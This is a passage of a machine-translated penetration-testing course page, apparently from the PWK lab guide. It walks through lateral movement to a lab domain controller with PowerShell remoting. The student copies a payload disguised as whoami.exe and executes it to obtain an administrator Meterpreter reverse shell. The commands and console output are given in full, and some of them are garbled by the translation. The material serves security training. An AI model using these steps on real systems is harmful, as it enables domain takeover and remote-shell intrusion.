<div style="position:absolute;top:45826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:45843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程260创建。</font></font></nobr></div>
<div style="position:absolute;top:45860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 5 已创建。</font></font></nobr></div>
<div style="position:absolute;top:45877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:45910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b></nobr></div>
<div style="position:absolute;top:45928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电源外壳</font></font></nobr></div>
<div style="position:absolute;top:45962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font></nobr></div>
<div style="position:absolute;top:45981;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1002 - 启动 PowerShell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 powershell 提示符下，我们将使用</font><font style="vertical-align: inherit;">带有标志</font><i><font style="vertical-align: inherit;">-Computer SANDBOXDC 的</font></i></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">New-PSSession</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来启动</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:46030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器上的新会话，将保存在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$dcsesh</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$dcsesh = New-PSSession -Computer SANDBOXDC</font></font></font></b></nobr></div>
<div style="position:absolute;top:46081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$dcsesh = New-PSSession -Computer SANDBOXDC</font></font></nobr></div>
<div style="position:absolute;top:46098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font></nobr></div>
<div style="position:absolute;top:46118;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1003 - 创建新的 PowerShell 会话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这里，我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-Command</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cmdlet 对域运行命令</font></font></nobr></div>
<div style="position:absolute;top:46166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器。</font><font style="vertical-align: inherit;">我们需要使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-Session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志和我们想要的命令</font><font style="vertical-align: inherit;">传入会话</font></font></nobr></div>
<div style="position:absolute;top:46186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ScriptBlock</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令执行。</font><font style="vertical-align: inherit;">我们想要执行的命令必须是</font></font></nobr></div>
<div style="position:absolute;top:46205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包裹在花括号中。</font><font style="vertical-align: inherit;">可以找到检查域控制器IP的示例</font></font></nobr></div>
<div style="position:absolute;top:46225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}</font></font></font></b></nobr></div>
<div style="position:absolute;top:46276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}</font></font></nobr></div>
<div style="position:absolute;top:46310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:46344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet0:</font></font></nobr></div>
<div style="position:absolute;top:46378;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：  </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:46507;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="40"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 40 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:46540;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:47617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:47617;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:47617;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">849</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46636;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链路本地 IPv6 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">：fe80::8539:433a:4360:175f%2</font></font></nobr></div>
<div style="position:absolute;top:46652;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.30</font></font></font></b></nobr></div>
<div style="position:absolute;top:46669;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:46686;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.5.5.1</font></font></nobr></div>
<div style="position:absolute;top:46704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:46723;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1004 - 使用 Invoke-Command 检查 IP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们知道我们可以对域控制器执行命令，我们将传输和</font></font></nobr></div>
<div style="position:absolute;top:46772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行一个meterpreter shell。</font><font style="vertical-align: inherit;">我们可以再次使用相同的 whoami.exe 绕过 AV。</font><font style="vertical-align: inherit;">首先，我们</font></font></nobr></div>
<div style="position:absolute;top:46791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将不得不将外壳转移到域控制器。</font><font style="vertical-align: inherit;">为此，我们将使用 PowerShell</font></font></nobr></div>
<div style="position:absolute;top:46810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Copy-Item</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">对于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制，项目</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转移到另一台主机，我们必须提供的文件传输，</font></font></nobr></div>
<div style="position:absolute;top:46829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输的目的地，以及我们之前创建的 PowerShell 会话。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:46881;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共\" -ToSession $dcsesh</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制项目 "C:\Users\Public\whoami.exe" -目标 "C:\Users\Public\" -ToSession $dcs</font></font></nobr></div>
<div style="position:absolute;top:46915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">esh</font></font></nobr></div>
<div style="position:absolute;top:46935;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1005 - 将 whoami 二进制文件传输到域控制器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输文件后，我们需要执行它。</font><font style="vertical-align: inherit;">但是，需要将侦听器配置为</font></font></nobr></div>
<div style="position:absolute;top:46983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">捕获反向shell请求。</font><font style="vertical-align: inherit;">为此，我们将当前的meterpreter shell 和</font></font></nobr></div>
<div style="position:absolute;top:47003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动一个新的监听器。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-j</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">将新的有效负载处理程序作为后台作业启动</font></font></nobr></div>
<div style="position:absolute;top:47022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令时。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景</font></font></font></b></nobr></div>
<div style="position:absolute;top:47074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 背景会议 2...</font></font></nobr></div>
<div style="position:absolute;top:47091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 -j</font></font></font></b></nobr></div>
<div style="position:absolute;top:47108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 作为后台作业 1 运行的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:47125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 漏洞利用完成，但没有创建会话。</font></font></nobr></div>
<div style="position:absolute;top:47159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:80 启动反向 TCP 处理程序</font></font></nobr></div>
<div style="position:absolute;top:47178;left:275"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1006 - 启动新的有效负载处理程序作为后台作业</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在监听器在后台运行，我们需要回到 Cevapi 上的会话</font></font></nobr></div>
<div style="position:absolute;top:47227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了在域控制器上执行 shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -l</font></font></font></b></nobr></div>
<div style="position:absolute;top:47296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活跃期</font></font></nobr></div>
<div style="position:absolute;top:47313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:47347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证类型    </font></font></nobr></div>
<div style="position:absolute;top:47347;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息    </font></font></nobr></div>
<div style="position:absolute;top:47347;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系</font></font></nobr></div>
<div style="position:absolute;top:47363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -    </font></font></nobr></div>
<div style="position:absolute;top:47363;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------    </font></font></nobr></div>
<div style="position:absolute;top:47363;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----------</font></font></nobr></div>
<div style="position:absolute;top:47381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 meterpreter x86/windows CEVAPI\jenkinsuser @ CEVAPI 10.11.0.4:80 -&gt; 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:47398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 meterpreter x86/windows NT AUTHORITY\SYSTEM @ CEVAPI 10.11.0.4:80 -&gt; 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:47431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -i 2</font></font></font></b></nobr></div>
<div style="position:absolute;top:47448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 开始与 2 ​​互动...</font></font></nobr></div>
<div style="position:absolute;top:47482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:47500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 5612 已创建。</font></font></nobr></div>
<div style="position:absolute;top:47516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 2 已创建。</font></font></nobr></div>
<div style="position:absolute;top:47550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b></nobr></div>
<div style="position:absolute;top:47567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电源外壳 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:47695;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="41"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 41 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:47728;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:48805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:48805;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:48805;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">850</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:47860;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1007 - 切换回 Cevapi 上的会话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后我们将执行 PowerShell 命令在域上运行 whoami 二进制文件</font></font></nobr></div>
<div style="position:absolute;top:47909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用以下命令的控制器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$dcsesh = New-PSSession -Computer SANDBOXDC</font></font></font></b></nobr></div>
<div style="position:absolute;top:47960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$dcsesh = New-PSSession -Computer SANDBOXDC</font></font></nobr></div>
<div style="position:absolute;top:47995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:48011;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami.exe}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\whoami.exe}</font></font></nobr></div>
<div style="position:absolute;top:48062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（180291 字节）到 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:48079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter 会话 3 在 17:31:12 打开 (10.11.0.4:80 -&gt; 10.11.1.250:54198)</font></font></nobr></div>
<div style="position:absolute;top:48099;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1008 - 执行 whoami 二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果二进制文件成功执行，我们将收到侦听器打开一个新会话的警报。</font></font></nobr></div>
<div style="position:absolute;top:48147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们首先介绍一下 Cevapi 的会话。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:48182;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止通道 2？</font><font style="vertical-align: inherit;">[Y / N]   </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:48216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景</font></font></font></b></nobr></div>
<div style="position:absolute;top:48233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 背景会议 2...</font></font></nobr></div>
<div style="position:absolute;top:48252;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1009 - 在 Cevapi 上退出会话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们回到 metasploit 控制台，我们就可以列出我们所有的活动会话，我们应该</font></font></nobr></div>
<div style="position:absolute;top:48301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看到在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SANDBOXDC</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font><font style="vertical-align: inherit;">上创建的一个新的</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -l</font></font></font></b></nobr></div>
<div style="position:absolute;top:48370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活跃期</font></font></nobr></div>
<div style="position:absolute;top:48387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:48421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证类型    </font></font></nobr></div>
<div style="position:absolute;top:48421;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息    </font></font></nobr></div>
<div style="position:absolute;top:48421;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系</font></font></nobr></div>
<div style="position:absolute;top:48438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -    </font></font></nobr></div>
<div style="position:absolute;top:48438;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------    </font></font></nobr></div>
<div style="position:absolute;top:48438;left:579"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----------</font></font></nobr></div>
<div style="position:absolute;top:48455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 meterpreter x86/windows CEVAPI\jenkinsuser @ CEVAPI 10.11.0.4:80 -&gt; 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:48472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 meterpreter x86/windows NT AUTHORITY\SYSTEM @ CEVAPI 10.11.0.4:80 -&gt; 10.11.1.250</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:48489;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 meterpreter x86/windows 沙箱\管理员 @ SANDBOXDC 10.11.0.4:80-&gt; 10.11.1</font></font></b></nobr></div>
<div style="position:absolute;top:48506;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.250</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48525;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1010 - 列出所有会话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们可以与新会话进行交互。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -i 3</font></font></font></b></nobr></div>
<div style="position:absolute;top:48607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 开始与 3 互动...</font></font></nobr></div>
<div style="position:absolute;top:48640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:48657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程3360创建。</font></font></nobr></div>
<div style="position:absolute;top:48674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 1 已创建。</font></font></nobr></div>
<div style="position:absolute;top:48691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.14393]</font></font></nobr></div>
<div style="position:absolute;top:48708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2016 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:48742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Administrator\Documents&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:48883;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="42"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 42 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48916;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:49993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
